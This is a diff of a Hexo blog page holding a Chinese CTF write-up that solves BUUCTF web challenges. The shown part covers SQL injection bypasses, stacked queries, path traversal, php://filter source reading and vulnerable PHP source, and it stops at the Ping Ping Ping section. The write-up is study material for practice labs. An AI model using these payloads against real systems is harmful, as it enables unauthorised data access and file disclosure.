@@ -1,155 +1,232 @@
-
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#FFF">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
-  <meta http-equiv="Cache-Control" content="no-transform">
-  <meta http-equiv="Cache-Control" content="no-siteapp">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
 
 
-<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://wscyoulin.github.io/rss.xml" />
-<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://wscyoulin.github.io/atom.xml" />
-<link rel="alternate" type="application/json" title="Hexo" href="http://wscyoulin.github.io/feed.json" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/css/main.css">
 
-<link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
-  
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wscyoulin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="[极客大挑战 2019]EasySQL万能密码注入：’ or 1&#x3D;1# 分析一下为什么这可以进后台，如果sql语句这样写：select * from admin where name&#x3D;’”.$_POST[‘name’].”‘and password&#x3D;’”.$_POST[‘password’].”‘“ 　　如果我们在账号处输入万能密码’or 1&#x3D;1# #后面的语句将会被注释掉，前面的条件就为真,这样">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu_web（1-20）">
+<meta property="og:url" content="http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[极客大挑战 2019]EasySQL万能密码注入：’ or 1&#x3D;1# 分析一下为什么这可以进后台，如果sql语句这样写：select * from admin where name&#x3D;’”.$_POST[‘name’].”‘and password&#x3D;’”.$_POST[‘password’].”‘“ 　　如果我们在账号处输入万能密码’or 1&#x3D;1# #后面的语句将会被注释掉，前面的条件就为真,这样">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/14/241905f313b3cb6e.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/14/2bb2ba9150e8feea.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/16/a0b6ae9e9e31c3f8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191126153703437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019112615410246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191126154451163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/18/1c74d0d28ed8bad3.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/18/c88b59ba0ff56de7.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/19/2841b101dec73ff8.png">
+<meta property="og:image" content="c:/Users/youlin/AppData/Roaming/Typora/typora-user-images/1666195536871.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/20/1169c6fb3d3eb192.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/20/a5667f18a5a235c6.png">
+<meta property="og:image" content="c:/Users/youlin/AppData/Roaming/Typora/typora-user-images/1666459083218.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/10/27/0a96d0093db00e6d.png">
+<meta property="og:image" content="https://tuchuangs.com/imgs/2022/11/02/3b756eba3b21ff75.png">
+<meta property="og:image" content="https://s1.z6r7.com/i/2022/11/17/3ukol.png">
+<meta property="article:published_time" content="2022-10-13T16:15:17.000Z">
+<meta property="article:modified_time" content="2022-11-18T16:39:28.193Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuangs.com/imgs/2022/10/14/241905f313b3cb6e.png">
+
 
 <link rel="canonical" href="http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/">
 
 
 
-  <title>
-buu_web（1-20） |
-youlin = Hexo</title>
-<meta name="generator" content="Hexo 6.0.0"></head>
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div id="loading">
-    <div class="cat">
-      <div class="body"></div>
-      <div class="head">
-        <div class="face"></div>
-      </div>
-      <div class="foot">
-        <div class="tummy-end"></div>
-        <div class="bottom"></div>
-        <div class="legs left"></div>
-        <div class="legs right"></div>
-      </div>
-      <div class="paw">
-        <div class="hands left"></div>
-        <div class="hands right"></div>
-      </div>
-    </div>
-  </div>
-  <div id="container">
-    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="inner">
-        <div id="brand">
-          <div class="pjax">
-          
-  <h1 itemprop="name headline">buu_web（1-20）
-  </h1>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/","path":"2022/10/14/buu-web（1-20）/","title":"buu_web（1-20）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>buu_web（1-20） | Hexo</title>
   
-<div class="meta">
-  <span class="item" title="Created: 2022-10-14 00:15:17">
-    <span class="icon">
-      <i class="ic i-calendar"></i>
-    </span>
-    <span class="text">Posted on</span>
-    <time itemprop="dateCreated datePublished" datetime="2022-10-14T00:15:17+08:00">2022-10-14</time>
-  </span>
-</div>
 
 
-          </div>
-        </div>
-        <nav id="nav">
-  <div class="inner">
-    <div class="toggle">
-      <div class="lines" aria-label="Toggle navigation bar">
-        <span class="line"></span>
-        <span class="line"></span>
-        <span class="line"></span>
-      </div>
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
     </div>
-    <ul class="menu">
-      <li class="item title"><a href="/" rel="start">youlin</a></li>
-    </ul>
-    <ul class="right">
-      <li class="item theme">
-        <i class="ic i-sun"></i>
-      </li>
-      <li class="item search">
-        <i class="ic i-search"></i>
-      </li>
-    </ul>
   </div>
-</nav>
 
-      </div>
-      <div id="imgs" class="pjax">
-        <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li>
-        </ul>
-      </div>
-    </header>
-    <div id="waves">
-      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
-        <defs>
-          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
-        </defs>
-        <g class="parallax">
-          <use xlink:href="#gentle-wave" x="48" y="0" />
-          <use xlink:href="#gentle-wave" x="48" y="3" />
-          <use xlink:href="#gentle-wave" x="48" y="5" />
-          <use xlink:href="#gentle-wave" x="48" y="7" />
-        </g>
-      </svg>
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
     </div>
-    <main>
-      <div class="inner">
-        <div id="main" class="pjax">
-          
-  <div class="article wrap">
-    
-<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
-<i class="ic i-home"></i>
-<span><a href="/">Home</a></span>
+  </div>
 </div>
 
-    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
-  <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/">
 
-  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="image" content="/images/avatar.jpg">
-    <meta itemprop="name" content="John Doe">
-    <meta itemprop="description" content=", ">
-  </span>
 
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
 
-  <div class="body md" itemprop="articleBody">
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">1.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">2.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="nav-number">3.</span> <span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-number">4.</span> <span class="nav-text">[ACTF2020 新生赛]Include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3"><span class="nav-number">4.1.</span> <span class="nav-text">知识详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter"><span class="nav-number">4.1.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="nav-number">5.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">6.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">7.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">8.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="nav-number">9.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="nav-number">10.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="nav-number">11.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">12.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="nav-number">13.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="nav-number">14.</span> <span class="nav-text">[ACTF2020 新生赛]Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="nav-number">15.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number">16.</span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="nav-number">17.</span> <span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">18.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="nav-number">19.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">20.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
     
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
 
-    <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码注入：’ or 1=1#</p>
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buu_web（1-20）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-10-14 00:15:17" itemprop="dateCreated datePublished" datetime="2022-10-14T00:15:17+08:00">2022-10-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-11-19 00:39:28" itemprop="dateModified" datetime="2022-11-19T00:39:28+08:00">2022-11-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码注入：’ or 1=1#</p>
 <p>分析一下为什么这可以进后台，如果sql语句这样写：select * from admin where name=’”.$_POST[‘name’].”‘and password=’”.$_POST[‘password’].”‘“ 　　如果我们在账号处输入万能密码’or 1=1#</p>
 <p>#后面的语句将会被注释掉，前面的条件就为真,这样无论我们输入什么密码，都可以进入了。</p>
 <p>这有个小提示，存在字符型注入的php网站是可以用万能密码’or 1=1#来注入的</p>
@@ -157,9 +234,9 @@ youlin = Hexo</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
 
 <p>进入/hint.php,可以看到打印了4次flag，直接目录穿越/file=hint.php?../../../../../ffffllllaaaagggg</p>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img data-src="https://tuchuangs.com/imgs/2022/10/14/241905f313b3cb6e.png"></p>
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="https://tuchuangs.com/imgs/2022/10/14/241905f313b3cb6e.png"></p>
 <p>看源码一眼丁真，直接用get方式给cat传参/?cat=dog</p>
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img data-src="https://tuchuangs.com/imgs/2022/10/14/2bb2ba9150e8feea.png">既然该文件名为flag.php，那么flag应该就存在于此文件中，但是我们f12并没有查看到flag，猜测flag应该是在flag.php的源代码当中</p>
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="https://tuchuangs.com/imgs/2022/10/14/2bb2ba9150e8feea.png">既然该文件名为flag.php，那么flag应该就存在于此文件中，但是我们f12并没有查看到flag，猜测flag应该是在flag.php的源代码当中</p>
 <p>我们可以利用php://filter伪协议来查看flag.php的源代码，构造payload：<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
 <p>可以获得将flag base64加密后的内容</p>
 <h3 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>作用：php://filter可以获取指定文件源码。当其与文件包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行，从而读取任意文件源代码。[1]<br>场景：</p>
@@ -180,19 +257,19 @@ youlin = Hexo</title>
 <p>先通过show databases爆出数据库。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure>
 
-<p><img data-src="https://tuchuangs.com/imgs/2022/10/16/a0b6ae9e9e31c3f8.png"></p>
+<p><img src="https://tuchuangs.com/imgs/2022/10/16/a0b6ae9e9e31c3f8.png"></p>
 <p>然后用 show tables 尝试爆表。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure>
 
-<p><img data-src="https://img-blog.csdnimg.cn/20191126153703437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191126153703437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
 <p>可以看到这里有两个表，我们先爆words表的内容。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure>
 
-<p><img data-src="https://img-blog.csdnimg.cn/2019112615410246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/2019112615410246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
 <p>这里一个知识点，表名为数字时，要用反引号包起来查询。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514`; #</span></span><br></pre></td></tr></table></figure>
 
-<p><img data-src="https://img-blog.csdnimg.cn/20191126154451163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191126154451163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
 <p>解题思路：</p>
 <p>1，通过 rename 先把 words 表改名为其他的表名。</p>
 <p>2，把 1919810931114514 表的名字改为 words 。</p>
@@ -216,8 +293,8 @@ youlin = Hexo</title>
 
 <p>||的特点是如果前面为真，后面就不会执行，那么我们传入*,1之后语句就会变成select *,1 from Flag，而1会在表添加一列1，所以得到flag</p>
 <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开靶场只有一个ip，尝试给他127.0.0.1试一试</p>
